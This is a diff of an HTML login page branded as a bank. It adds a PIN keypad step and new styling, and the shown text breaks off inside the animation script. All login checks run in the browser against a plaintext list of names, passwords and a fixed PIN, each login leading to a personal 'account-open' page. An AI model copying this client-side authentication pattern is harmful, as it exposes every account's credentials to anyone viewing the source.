@@ -1,303 +1,2047 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <title>Login | Harborview Bank</title>
+
   <meta name="robots" content="index, follow">
   <meta name="author" content="Harborview Bank">
-  <!-- Open Graph (optional) -->
+
   <meta property="og:title" content="Harborview Bank | Modern Banking for Your Future">
+
   <meta property="og:description" content="Harborview Bank offers secure personal and business banking solutions.">
+
   <meta property="og:url" content="https://harborviewbank.com/">
+
   <meta property="og:type" content="website">
+
   <meta property="og:image" content="https://harborviewbank.com/assets/images/social-share.jpg">
 
+
   <!-- Favicons -->
-  <link rel="apple-touch-icon" sizes="180x180" href="assets/images/favicons/apple-touch-icon.png" />
-  <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicons/favicon-32x32.png" />
-  <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicons/favicon-16x16.png" />
-  <link rel="manifest" href="assets/images/favicons/site.webmanifest" />
+
+  <link rel="apple-touch-icon" sizes="180x180" href="assets/images/favicons/apple-touch-icon.png">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicons/favicon-32x32.png">
+
+  <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicons/favicon-16x16.png">
+
+  <link rel="manifest" href="assets/images/favicons/site.webmanifest">
 
 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <!-- Font Awesome -->
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+
   <style>
-      /* Reset */
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
+    /* ==========================================
+       RESET
+       ========================================== */
 
-body, html {
-  height: 100%;
-  font-family: 'Poppins', sans-serif;
-  background: orange; /* fallback */
-}
-
-.hero {
-  background: url('assets/images/backgrounds/login-bg.jpg') center/cover no-repeat;
-  position: relative;
-  height: 100%;
-  opacity: 0;
-  transition: opacity 1s ease;
-}
-
-.hero.loaded {
-  opacity: 1;
-}
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
 
-.hero .overlay {
-  position: absolute;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: #392b58a2;
-} 
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+
+      font-family: 'Poppins', sans-serif;
+
+      background: orange;
+
+      overflow: hidden;
+    }
 
 
-.login-card {
-  position: absolute;
-  top: 50%; left: 50%;
-  transform: translate(-50%, -50%);
-  background: rgba(255, 255, 255, 0.05);
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  backdrop-filter: blur(20px);
-  border-radius: 15px;
-  padding: 40px;
-  max-width: 400px;
-  width: 100%;
-  color: #fff;
-  text-align: center;
-  box-shadow: 0 8px 32px rgba(0,0,0,0.2);
-  z-index: 2;
-}
+    /* ==========================================
+       HERO
+       ========================================== */
 
-.login-card .logo img {
-  height: 70px;
-  margin-bottom: 20px;
-}
+    .hero {
 
-.login-card h2 {
-  margin-bottom: 30px;
-  font-weight: 600;
-}
+      position: relative;
 
-.input-group {
-  position: relative;
-  margin-bottom: 20px;
-}
+      width: 100%;
 
-.input-group i {
-  position: absolute;
-  top: 50%;
-  left: 15px;
-  transform: translateY(-50%);
-  color: #fff;
-}
+      min-height: 100vh;
 
-.input-group input {
-  width: 100%;
-  padding: 15px 15px 15px 45px;
-  border: none;
-  border-radius: 30px;
-  background: rgba(255, 255, 255, 0.1);
-  color: #fff;
-}
+      height: 100dvh;
 
-.input-group input::placeholder {
-  color: #ddd;
-}
+      overflow: hidden;
 
-.options {
-  display: flex;
-  justify-content: space-between;
-  font-size: 14px;
-  margin-bottom: 20px;
-}
+      background:
+        url('assets/images/backgrounds/login-bg.jpg') center / cover no-repeat;
 
-.options a {
-  color: #f88119;
-  text-decoration: none;
-}
+      opacity: 0;
 
-.error-message {
-  color: #ff4d4d;
-  margin-bottom: 15px;
-  min-height: 20px;
-}
+      transition:
+        opacity 1s ease;
+    }
 
-.btn {
-  width: 100%;
-  padding: 15px;
-  border: none;
-  border-radius: 30px;
-  background: linear-gradient(135deg, #ff9900, #ff6600);
-  color: #fff;
-  font-weight: 600;
-  cursor: pointer;
-  transition: 0.3s ease;
-}
 
-.btn:hover {
-  opacity: 0.9;
-}
+    .hero.loaded {
+      opacity: 1;
+    }
 
-.signup-link {
-  margin-top: 20px;
-  font-size: 14px;
-}
 
-.signup-link a {
-  color: #fff;
-  text-decoration: underline;
-}
-.hero {
-  position: relative;
-  overflow: hidden;
-}
+    /* ==========================================
+       OVERLAY
+       ========================================== */
 
-#sparkCanvas {
-  position: absolute;
-  top: 0; left: 0;
-  width: 100%;
-  height: 100%;
-  z-index: 1; /* behind the login card */
-  display: block;
-}
+    .hero .overlay {
 
+      position: absolute;
+
+      inset: 0;
+
+      background: #392b58a2;
+
+      z-index: 0;
+    }
+
+
+    /* ==========================================
+       PARTICLES
+       ========================================== */
+
+    #sparkCanvas {
+
+      position: absolute;
+
+      top: 0;
+      left: 0;
+
+      width: 100%;
+      height: 100%;
+
+      z-index: 1;
+
+      display: block;
+    }
+
+
+    /* ==========================================
+       MAIN CARD
+       ========================================== */
+
+    .login-card {
+
+      position: absolute;
+
+      top: 50%;
+      left: 50%;
+
+      transform:
+        translate(-50%, -50%);
+
+      width:
+        min(400px, calc(100% - 24px));
+
+      max-height:
+        calc(100vh - 24px);
+
+      padding:
+        24px 28px;
+
+      background:
+        rgba(255, 255, 255, 0.05);
+
+      border:
+        1px solid rgba(255, 255, 255, 0.1);
+
+      backdrop-filter:
+        blur(20px);
+
+      -webkit-backdrop-filter:
+        blur(20px);
+
+      border-radius:
+        15px;
+
+      color:
+        #fff;
+
+      text-align:
+        center;
+
+      box-shadow:
+        0 8px 32px rgba(0, 0, 0, 0.2);
+
+      z-index:
+        2;
+
+      overflow-y:
+        auto;
+
+      transition:
+        opacity 0.3s ease,
+        transform 0.3s ease;
+    }
+
+
+    .login-card.hidden {
+
+      opacity: 0;
+
+      pointer-events: none;
+
+      transform:
+        translate(-50%, -47%);
+    }
+
+
+    /* ==========================================
+       LOGO
+       ========================================== */
+
+    .login-card .logo img {
+
+      height:
+        58px;
+
+      width:
+        auto;
+
+      max-width:
+        180px;
+
+      object-fit:
+        contain;
+
+      margin-bottom:
+        10px;
+    }
+
+
+    /* ==========================================
+       HEADINGS
+       ========================================== */
+
+    .login-card h2 {
+
+      margin-bottom:
+        8px;
+
+      font-size:
+        22px;
+
+      font-weight:
+        600;
+    }
+
+
+    /* ==========================================
+       VERIFICATION DESCRIPTION
+       ========================================== */
+
+    .verification-subtitle {
+
+      color:
+        #ddd;
+
+      font-size:
+        13px;
+
+      line-height:
+        1.45;
+
+      margin:
+        0 auto 12px;
+
+      max-width:
+        290px;
+    }
+
+
+    /* ==========================================
+       LOGIN INPUTS
+       ========================================== */
+
+    .input-group {
+
+      position:
+        relative;
+
+      margin-bottom:
+        18px;
+    }
+
+
+    .input-group i {
+
+      position:
+        absolute;
+
+      top:
+        50%;
+
+      left:
+        15px;
+
+      transform:
+        translateY(-50%);
+
+      color:
+        #fff;
+    }
+
+
+    .input-group input {
+
+      width:
+        100%;
+
+      padding:
+        14px 15px 14px 45px;
+
+      border:
+        none;
+
+      outline:
+        none;
+
+      border-radius:
+        30px;
+
+      background:
+        rgba(255, 255, 255, 0.1);
+
+      color:
+        #fff;
+
+      font-size:
+        14px;
+    }
+
+
+    .input-group input::placeholder {
+      color: #ddd;
+    }
+
+
+    /* ==========================================
+       LOGIN OPTIONS
+       ========================================== */
+
+    .options {
+
+      display:
+        flex;
+
+      justify-content:
+        space-between;
+
+      font-size:
+        13px;
+
+      margin-bottom:
+        15px;
+
+      gap:
+        10px;
+    }
+
+
+    .options a {
+
+      color:
+        #f88119;
+
+      text-decoration:
+        none;
+    }
+
+
+    /* ==========================================
+       ERROR / SUCCESS
+       ========================================== */
+
+    .error-message {
+
+      color:
+        #ff4d4d;
+
+      min-height:
+        18px;
+
+      margin-bottom:
+        5px;
+
+      font-size:
+        12px;
+    }
+
+
+    .success-message {
+
+      color:
+        #72ff9b;
+
+      min-height:
+        18px;
+
+      margin-bottom:
+        5px;
+
+      font-size:
+        12px;
+    }
+
+
+    /* ==========================================
+       MAIN LOGIN BUTTON
+       ========================================== */
+
+    .btn {
+
+      width:
+        100%;
+
+      padding:
+        14px;
+
+      border:
+        none;
+
+      border-radius:
+        30px;
+
+      background:
+        linear-gradient(135deg,
+          #ff9900,
+          #ff6600);
+
+      color:
+        #fff;
+
+      font-weight:
+        600;
+
+      cursor:
+        pointer;
+
+      transition:
+        0.3s ease;
+    }
+
+
+    .btn:hover {
+
+      opacity:
+        0.9;
+
+      transform:
+        translateY(-1px);
+    }
+
+
+    /* ==========================================
+       SIGN UP
+       ========================================== */
+
+    .signup-link {
+
+      margin-top:
+        16px;
+
+      font-size:
+        13px;
+    }
+
+
+    .signup-link a {
+
+      color:
+        #fff;
+
+      text-decoration:
+        underline;
+    }
+
+
+    /* ==========================================
+       DEMO NOTICE
+       ========================================== */
+
+    .demo-notice {
+
+      display:
+        inline-block;
+
+      padding:
+        5px 11px;
+
+      margin-bottom:
+        10px;
+
+      border-radius:
+        20px;
+
+      background:
+        rgba(255, 153, 0, 0.12);
+
+      border:
+        1px solid rgba(255, 153, 0, 0.25);
+
+      color:
+        #ffc078;
+
+      font-size:
+        11px;
+    }
+
+
+    /* ==========================================
+       FOUR CODE BOXES
+       ========================================== */
+
+    .code-display {
+
+      display:
+        flex;
+
+      justify-content:
+        center;
+
+      align-items:
+        center;
+
+      gap:
+        9px;
+
+      margin:
+        8px 0 10px;
+    }
+
+
+    .code-box {
+
+      width:
+        45px;
+
+      height:
+        45px;
+
+      border-radius:
+        10px;
+
+      border:
+        1px solid rgba(255, 255, 255, 0.25);
+
+      background:
+        rgba(255, 255, 255, 0.08);
+
+      display:
+        flex;
+
+      align-items:
+        center;
+
+      justify-content:
+        center;
+
+      color:
+        #fff;
+
+      font-size:
+        18px;
+
+      font-weight:
+        600;
+
+      transition:
+        background 0.15s ease,
+        transform 0.15s ease,
+        border-color 0.15s ease;
+    }
+
+
+    .code-box.filled {
+
+      background:
+        rgba(255, 255, 255, 0.16);
+
+      border-color:
+        rgba(255, 255, 255, 0.45);
+    }
+
+
+    .code-box.revealing {
+
+      transform:
+        scale(1.05);
+    }
+
+
+    /* ==========================================
+       KEYPAD
+       ========================================== */
+
+    .keypad {
+
+      display:
+        grid;
+
+      grid-template-columns:
+        repeat(3, 1fr);
+
+      gap:
+        8px;
+
+      width:
+        100%;
+
+      max-width:
+        245px;
+
+      margin:
+        8px auto 12px;
+    }
+
+
+    .key {
+
+      width:
+        100%;
+
+      height:
+        48px;
+
+      border:
+        1px solid rgba(255, 255, 255, 0.14);
+
+      border-radius:
+        50%;
+
+      background:
+        rgba(255, 255, 255, 0.08);
+
+      color:
+        #fff;
+
+      font-size:
+        18px;
+
+      font-weight:
+        500;
+
+      cursor:
+        pointer;
+
+      display:
+        flex;
+
+      align-items:
+        center;
+
+      justify-content:
+        center;
+
+      transition:
+        background 0.15s ease,
+        transform 0.1s ease,
+        border-color 0.15s ease;
+    }
+
+
+    .key:hover {
+
+      background:
+        rgba(255, 255, 255, 0.16);
+
+      border-color:
+        rgba(255, 255, 255, 0.3);
+    }
+
+
+    .key:active {
+
+      transform:
+        scale(0.91);
+
+      background:
+        rgba(255, 255, 255, 0.22);
+    }
+
+
+    .action-key {
+
+      font-size:
+        15px;
+
+      color:
+        #ddd;
+    }
+
+
+    /* ==========================================
+       BACK BUTTON
+       ========================================== */
+
+    .secondary-btn {
+
+      width:
+        100%;
+
+      padding:
+        10px;
+
+      margin-top:
+        5px;
+
+      border:
+        1px solid rgba(255, 255, 255, 0.25);
+
+      border-radius:
+        25px;
+
+      background:
+        transparent;
+
+      color:
+        #fff;
+
+      cursor:
+        pointer;
+
+      font-size:
+        13px;
+
+      transition:
+        0.3s ease;
+    }
+
+
+    .secondary-btn:hover {
+
+      background:
+        rgba(255, 255, 255, 0.08);
+    }
+
+
+    /* ==========================================
+       MOBILE
+       ========================================== */
+
+    @media (max-width: 480px) {
+
+      .login-card {
+
+        width:
+          calc(100% - 20px);
+
+        max-height:
+          calc(100dvh - 16px);
+
+        padding:
+          18px 20px;
+
+        border-radius:
+          14px;
+      }
+
+
+      .login-card .logo img {
+
+        height:
+          48px;
+
+        margin-bottom:
+          6px;
+      }
+
+
+      .login-card h2 {
+
+        font-size:
+          19px;
+
+        margin-bottom:
+          5px;
+      }
+
+
+      .verification-subtitle {
+
+        font-size:
+          12px;
+
+        margin-bottom:
+          8px;
+      }
+
+
+      .demo-notice {
+
+        margin-bottom:
+          7px;
+
+        padding:
+          4px 9px;
+      }
+
+
+      .code-display {
+
+        gap:
+          7px;
+
+        margin:
+          6px 0 7px;
+      }
+
+
+      .code-box {
+
+        width:
+          42px;
+
+        height:
+          42px;
+
+        border-radius:
+          9px;
+      }
+
+
+      .keypad {
+
+        max-width:
+          225px;
+
+        gap:
+          6px;
+
+        margin:
+          6px auto 8px;
+      }
+
+
+      .key {
+
+        height:
+          43px;
+
+        font-size:
+          17px;
+      }
+
+
+      .secondary-btn {
+
+        padding:
+          8px;
+
+        margin-top:
+          3px;
+      }
+
+    }
+
+
+    /* ==========================================
+       VERY SHORT SCREENS
+       ========================================== */
+
+    @media (max-height: 650px) {
+
+      .login-card {
+
+        padding:
+          12px 20px;
+      }
+
+
+      .login-card .logo img {
+
+        height:
+          38px;
+
+        margin-bottom:
+          3px;
+      }
+
+
+      .login-card h2 {
+
+        font-size:
+          18px;
+
+        margin-bottom:
+          3px;
+      }
+
+
+      .verification-subtitle {
+
+        margin-bottom:
+          5px;
+      }
+
+
+      .demo-notice {
+
+        margin-bottom:
+          4px;
+      }
+
+
+      .code-display {
+
+        margin:
+          4px 0;
+      }
+
+
+      .code-box {
+
+        width:
+          38px;
+
+        height:
+          38px;
+      }
+
+
+      .keypad {
+
+        gap:
+          4px;
+
+        margin:
+          4px auto 5px;
+      }
+
+
+      .key {
+
+        height:
+          38px;
+      }
+
+
+      .secondary-btn {
+
+        padding:
+          6px;
+      }
+
+    }
   </style>
+
 </head>
+
+
 <body>
+
+
   <div class="hero">
+
+
     <div class="overlay"></div>
+
+
     <canvas id="sparkCanvas"></canvas>
-    <!-- Your login card -->
-    <div class="login-card">
+
+
+    <!-- ==========================================
+         LOGIN CARD
+         ========================================== -->
+
+    <div class="login-card" id="loginCard">
+
+
       <div class="logo">
+
         <img src="assets/images/resources/logo-003.png" alt="Harborview Bank">
+
       </div>
-      <h2>Sign In to Your Account</h2>
+
+
+      <h2>
+        Sign In to Your Account
+      </h2>
+
+
       <form id="loginForm">
+
+
         <div class="input-group">
+
           <i class="fas fa-user"></i>
-          <input type="text" placeholder="Username" required>
+
+          <input type="text" id="username" placeholder="Username" autocomplete="username" required>
+
         </div>
+
+
         <div class="input-group">
+
           <i class="fas fa-lock"></i>
-          <input type="password" placeholder="Password" required>
+
+          <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+
         </div>
+
+
         <div class="options">
-          <label><input type="checkbox"> Remember me</label>
-          <a href="#">Forgot password?</a>
+
+          <label>
+
+            <input type="checkbox">
+
+            Remember me
+
+          </label>
+
+
+          <a href="#">
+            Forgot password?
+          </a>
+
         </div>
-        <div class="error-message" id="error-message"></div>
-        <button type="submit" class="btn">Login</button>
-        <p class="signup-link">Not a member? <a href="register.html">Create an account</a></p>
+
+
+        <div class="error-message" id="error-message">
+        </div>
+
+
+        <button type="submit" class="btn">
+
+          Login
+
+        </button>
+
+
+        <p class="signup-link">
+
+          Not a member?
+
+          <a href="register.html">
+            Create an account
+          </a>
+
+        </p>
+
+
       </form>
+
     </div>
+
+
+    <!-- ==========================================
+         VERIFICATION CARD
+         ========================================== -->
+
+    <div class="login-card hidden" id="verificationCard">
+
+
+      <div class="logo">
+
+        <img src="assets/images/resources/logo-003.png" alt="Harborview Bank">
+
+      </div>
+
+
+      <h2>
+        Verify Your Identity
+      </h2>
+
+
+      <p class="verification-subtitle">
+        Please enter your secure 4-digit PIN to continue.
+      </p>
+
+
+      <div class="demo-notice">
+
+        Your security is our priority. PIN verification protects your account from unauthorized access.
+
+      </div>
+
+
+      <!-- FOUR CODE BOXES -->
+
+      <div class="code-display" id="codeDisplay">
+
+        <div class="code-box"></div>
+
+        <div class="code-box"></div>
+
+        <div class="code-box"></div>
+
+        <div class="code-box"></div>
+
+      </div>
+
+
+      <div class="error-message" id="verificationError">
+      </div>
+
+
+      <div class="success-message" id="verificationSuccess">
+      </div>
+
+
+      <!-- ======================================
+           KEYPAD
+           ====================================== -->
+
+      <div class="keypad">
+
+
+        <button type="button" class="key" data-key="1">
+          1
+        </button>
+
+
+        <button type="button" class="key" data-key="2">
+          2
+        </button>
+
+
+        <button type="button" class="key" data-key="3">
+          3
+        </button>
+
+
+        <button type="button" class="key" data-key="4">
+          4
+        </button>
+
+
+        <button type="button" class="key" data-key="5">
+          5
+        </button>
+
+
+        <button type="button" class="key" data-key="6">
+          6
+        </button>
+
+
+        <button type="button" class="key" data-key="7">
+          7
+        </button>
+
+
+        <button type="button" class="key" data-key="8">
+          8
+        </button>
+
+
+        <button type="button" class="key" data-key="9">
+          9
+        </button>
+
+
+        <button type="button" class="key action-key" id="resetCode" aria-label="Reset">
+
+          <i class="fas fa-rotate-left"></i>
+
+        </button>
+
+
+        <button type="button" class="key" data-key="0">
+
+          0
+
+        </button>
+
+
+        <button type="button" class="key action-key" id="deleteCode" aria-label="Delete">
+
+          <i class="fas fa-delete-left"></i>
+
+        </button>
+
+
+      </div>
+
+
+      <button type="button" class="secondary-btn" id="backButton">
+
+        Back
+
+      </button>
+
+
+    </div>
+
+
   </div>
 
+
+  <!-- ==========================================
+       LOGIN + VERIFICATION JAVASCRIPT
+       ========================================== -->
+
   <script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("loginForm");
-    const errorMessage = document.getElementById("error-message");
 
-    // ✅ Store valid username/password pairs in an array of objects
-    const validUsers = [
-      { username: "Janet Panarites", password: "Janettt@69", redirect: "gdhxgccvgf5fxcv234-janet-panarites-account-open.html"},
-      { username: "Iris Wells", password: "Irisann@69", redirect: "gdhxgccvgf5fxcv234-lucia-panarites-account-open.html" },
-      { username: "Stacy Wilson", password: "Stacy@69", redirect: "itsotd63648jfifu47-wilson-stacy-account-open.html" },
-      { username: "Stacy Garner", password: "Stacy@79", redirect: "gdhxgccvgf5fxcv234-garner-stacy-account-open.html" },
-      { username: "Stacy Garner", password: "Stacyallen@69", redirect: "gdhxgccvgf5fxcv234-sstacy-garner-account-open.html" },
-      { username: "Stacy Garner", password: "Stacy@59", redirect: "gdhxgccvgf5fxcv234-stacy-garner-account-open.html" },
-      { username: "Comfort Tei", password: "Comfort@69", redirect: "gdhxgccvgf5fxcv234-comfort-account-open.html" },
-      { username: "Iris Wells", password: "Tenderheart@30", redirect: "gdhxgccvgf5fxcv234-iris-wells-account-open.html" },
-      
-    ];
+    document.addEventListener(
+      "DOMContentLoaded",
+      function () {
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
 
-      const username = form.querySelector('input[type="text"]').value;
-      const password = form.querySelector('input[type="password"]').value;
+        /* ======================================
+           ELEMENTS
+           ====================================== */
 
-      // ✅ Find a match
-      const user = validUsers.find(
-        (user) => user.username === username && user.password === password
+        const loginCard =
+          document.getElementById("loginCard");
+
+
+        const verificationCard =
+          document.getElementById(
+            "verificationCard"
+          );
+
+
+        const loginForm =
+          document.getElementById(
+            "loginForm"
+          );
+
+
+        const errorMessage =
+          document.getElementById(
+            "error-message"
+          );
+
+
+        const verificationError =
+          document.getElementById(
+            "verificationError"
+          );
+
+
+        const verificationSuccess =
+          document.getElementById(
+            "verificationSuccess"
+          );
+
+
+        const codeBoxes =
+          document.querySelectorAll(
+            ".code-box"
+          );
+
+
+        const keypadButtons =
+          document.querySelectorAll(
+            ".key[data-key]"
+          );
+
+
+        const resetCodeButton =
+          document.getElementById(
+            "resetCode"
+          );
+
+
+        const deleteCodeButton =
+          document.getElementById(
+            "deleteCode"
+          );
+
+
+        const backButton =
+          document.getElementById(
+            "backButton"
+          );
+
+
+        /* ======================================
+           DEMO USERS
+           ====================================== */
+
+        const validUsers = [
+
+          {
+            username:
+              "Janet Panarites",
+
+            password:
+              "Janettt@69",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-janet-panarites-account-open.html"
+          },
+
+
+          {
+            username:
+              "Iris Wells",
+
+            password:
+              "Irisann@69",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-lucia-panarites-account-open.html"
+          },
+
+
+          {
+            username:
+              "Stacy Wilson",
+
+            password:
+              "Stacy@69",
+
+            redirect:
+              "itsotd63648jfifu47-wilson-stacy-account-open.html"
+          },
+
+
+          {
+            username:
+              "Stacy Garner",
+
+            password:
+              "Stacy@79",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-garner-stacy-account-open.html"
+          },
+
+
+          {
+            username:
+              "Stacy Garner",
+
+            password:
+              "Stacyallen@69",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-sstacy-garner-account-open.html"
+          },
+
+
+          {
+            username:
+              "Stacy Garner",
+
+            password:
+              "Stacy@59",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-stacy-garner-account-open.html"
+          },
+
+
+          {
+            username:
+              "Comfort Tei",
+
+            password:
+              "Comfort@69",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-comfort-account-open.html"
+          },
+
+
+          {
+            username:
+              "Iris Wells",
+
+            password:
+              "Tenderheart@30",
+
+            redirect:
+              "gdhxgccvgf5fxcv234-iris-wells-account-open.html"
+          }
+
+        ];
+
+
+        /* ======================================
+           DEMO VERIFICATION
+           ====================================== */
+
+        const DEMO_CODE =
+          "2468";
+
+
+        let pendingUser =
+          null;
+
+
+        let enteredCode =
+          "";
+
+
+        /* ======================================
+           LOGIN
+           ====================================== */
+
+        loginForm.addEventListener(
+          "submit",
+          function (e) {
+
+            e.preventDefault();
+
+
+            errorMessage.textContent =
+              "";
+
+
+            const username =
+              document
+                .getElementById("username")
+                .value
+                .trim();
+
+
+            const password =
+              document
+                .getElementById("password")
+                .value;
+
+
+            const user =
+              validUsers.find(
+                function (user) {
+
+                  return (
+                    user.username === username &&
+                    user.password === password
+                  );
+
+                }
+              );
+
+
+            if (!user) {
+
+              errorMessage.textContent =
+                "Invalid username or password.";
+
+              return;
+
+            }
+
+
+            pendingUser =
+              user;
+
+
+            loginCard.classList.add(
+              "hidden"
+            );
+
+
+            setTimeout(
+              function () {
+
+                verificationCard.classList.remove(
+                  "hidden"
+                );
+
+                clearVerification();
+
+              },
+              250
+            );
+
+          }
+        );
+
+
+        /* ======================================
+           UPDATE CODE BOXES
+           ====================================== */
+
+        function updateCodeDisplay() {
+
+          codeBoxes.forEach(
+            function (box, index) {
+
+              box.classList.remove(
+                "filled"
+              );
+
+              box.classList.remove(
+                "revealing"
+              );
+
+
+              if (
+                index <
+                enteredCode.length
+              ) {
+
+                box.textContent =
+                  "●";
+
+                box.classList.add(
+                  "filled"
+                );
+
+              } else {
+
+                box.textContent =
+                  "";
+
+              }
+
+            }
+          );
+
+        }
+
+
+        /* ======================================
+           SHOW LAST DIGIT BRIEFLY
+           ====================================== */
+
+        function revealLastDigit() {
+
+          if (
+            enteredCode.length === 0
+          ) {
+            return;
+          }
+
+
+          const index =
+            enteredCode.length - 1;
+
+
+          const box =
+            codeBoxes[index];
+
+
+          const digit =
+            enteredCode[index];
+
+
+          box.textContent =
+            digit;
+
+
+          box.classList.add(
+            "filled"
+          );
+
+
+          box.classList.add(
+            "revealing"
+          );
+
+
+          setTimeout(
+            function () {
+
+              if (
+                enteredCode[index] === digit &&
+                enteredCode.length > index
+              ) {
+
+                box.textContent =
+                  "●";
+
+                box.classList.remove(
+                  "revealing"
+                );
+
+              }
+
+            },
+            600
+          );
+
+        }
+
+
+        /* ======================================
+           ADD DIGIT
+           ====================================== */
+
+        function addDigit(digit) {
+
+          if (
+            enteredCode.length >= 4
+          ) {
+            return;
+          }
+
+
+          verificationError.textContent =
+            "";
+
+          verificationSuccess.textContent =
+            "";
+
+
+          enteredCode += digit;
+
+
+          updateCodeDisplay();
+
+
+          revealLastDigit();
+
+
+          if (
+            enteredCode.length === 4
+          ) {
+
+            setTimeout(
+              function () {
+
+                verifyCode();
+
+              },
+              350
+            );
+
+          }
+
+        }
+
+
+        /* ======================================
+           VERIFY
+           ====================================== */
+
+        function verifyCode() {
+
+          if (
+            enteredCode === DEMO_CODE
+          ) {
+
+            verificationError.textContent =
+              "";
+
+
+            verificationSuccess.textContent =
+              "Verification successful. Continuing...";
+
+
+            setTimeout(
+              function () {
+
+                if (pendingUser) {
+
+                  window.location.href =
+                    pendingUser.redirect;
+
+                }
+
+              },
+              700
+            );
+
+
+            return;
+
+          }
+
+
+          verificationSuccess.textContent =
+            "";
+
+
+          verificationError.textContent =
+            "Incorrect demo verification code.";
+
+
+          setTimeout(
+            function () {
+
+              clearVerification();
+
+            },
+            700
+          );
+
+        }
+
+
+        /* ======================================
+           CLEAR CODE
+           ====================================== */
+
+        function clearVerification() {
+
+          enteredCode =
+            "";
+
+
+          verificationError.textContent =
+            "";
+
+
+          verificationSuccess.textContent =
+            "";
+
+
+          updateCodeDisplay();
+
+        }
+
+
+        /* ======================================
+           NUMBER BUTTONS
+           ====================================== */
+
+        keypadButtons.forEach(
+          function (button) {
+
+            button.addEventListener(
+              "click",
+              function () {
+
+                const digit =
+                  this.dataset.key;
+
+
+                addDigit(digit);
+
+              }
+            );
+
+          }
+        );
+
+
+        /* ======================================
+           DELETE
+           ====================================== */
+
+        deleteCodeButton.addEventListener(
+          "click",
+          function () {
+
+            if (
+              enteredCode.length === 0
+            ) {
+              return;
+            }
+
+
+            verificationError.textContent =
+              "";
+
+
+            verificationSuccess.textContent =
+              "";
+
+
+            enteredCode =
+              enteredCode.slice(
+                0,
+                -1
+              );
+
+
+            updateCodeDisplay();
+
+          }
+        );
+
+
+        /* ======================================
+           RESET
+           ====================================== */
+
+        resetCodeButton.addEventListener(
+          "click",
+          function () {
+
+            clearVerification();
+
+          }
+        );
+
+
+        /* ======================================
+           BACK
+           ====================================== */
+
+        backButton.addEventListener(
+          "click",
+          function () {
+
+            clearVerification();
+
+
+            pendingUser =
+              null;
+
+
+            verificationCard.classList.add(
+              "hidden"
+            );
+
+
+            setTimeout(
+              function () {
+
+                loginCard.classList.remove(
+                  "hidden"
+                );
+
+              },
+              250
+            );
+
+          }
+        );
+
+
+        /* ======================================
+           INITIALIZE
+           ====================================== */
+
+        updateCodeDisplay();
+
+      }
+    );
+
+  </script>
+
+
+  <!-- ==========================================
+       HERO FADE-IN
+       ========================================== -->
+
+  <script>
+
+    window.onload =
+      function () {
+
+        const heroElement =
+          document.querySelector(
+            ".hero"
+          );
+
+
+        heroElement.classList.add(
+          "loaded"
+        );
+
+      };
+
+  </script>
+
+
+  <!-- ==========================================
+       SPARK / PARTICLE ANIMATION
+       ========================================== -->
+
+  <script>
+
+    const canvas =
+      document.getElementById(
+        "sparkCanvas"
       );
 
-      if (user) {
-        window.location.href = user.redirect; // ✅ Redirect to their page
-      } else {
-        errorMessage.textContent = "Invalid username or password.";
+
+    const ctx =
+      canvas.getContext("2d");
+
+
+    let width =
+      canvas.width =
+      window.innerWidth;
+
+
+    let height =
+      canvas.height =
+      window.innerHeight;
+
+
+    window.addEventListener(
+      "resize",
+      function () {
+
+        width =
+          canvas.width =
+          window.innerWidth;
+
+
+        height =
+          canvas.height =
+          window.innerHeight;
+
       }
-    });
-  });
-</script>
+    );
 
-  <script>
-  window.onload = function() {
-    const heroElement = document.querySelector('.hero');
-    heroElement.classList.add('loaded');
-  };
-</script>
-<script>
-  const canvas = document.getElementById('sparkCanvas');
-  const ctx = canvas.getContext('2d');
 
-  let width = canvas.width = window.innerWidth;
-  let height = canvas.height = window.innerHeight;
+    const NUM_PARTICLES =
+      150;
 
-  window.addEventListener('resize', () => {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
-  });
 
-  const NUM_PARTICLES = 150;
-  const particles = [];
+    const particles =
+      [];
 
-  for (let i = 0; i < NUM_PARTICLES; i++) {
-    particles.push({
-      x: Math.random() * width,
-      y: Math.random() * height,
-      radius: Math.random() * 2 + 1,
-      dx: (Math.random() - 0.5) * 0.5,
-      dy: (Math.random() - 0.5) * 0.5,
-      opacity: Math.random(),
-      flickerSpeed: Math.random() * 0.02 + 0.005
-    });
-  }
 
-  function animate() {
-    ctx.clearRect(0, 0, width, height);
-    particles.forEach(p => {
-      // Update position
-      p.x += p.dx;
-      p.y += p.dy;
+    for (
+      let i = 0;
+      i < NUM_PARTICLES;
+      i++
+    ) {
 
-      // Bounce on edges
-      if (p.x < 0 || p.x > width) p.dx *= -1;
-      if (p.y < 0 || p.y > height) p.dy *= -1;
+      particles.push({
 
-      // Flicker effect
-      p.opacity += p.flickerSpeed;
-      if (p.opacity >= 1 || p.opacity <= 0.3) p.flickerSpeed *= -1;
+        x:
+          Math.random() * width,
 
-      // Draw glow
-      const gradient = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.radius * 4);
-      gradient.addColorStop(0, `rgba(255, 255, 255, ${p.opacity})`);
-      gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
+        y:
+          Math.random() * height,
 
-      ctx.fillStyle = gradient;
-      ctx.beginPath();
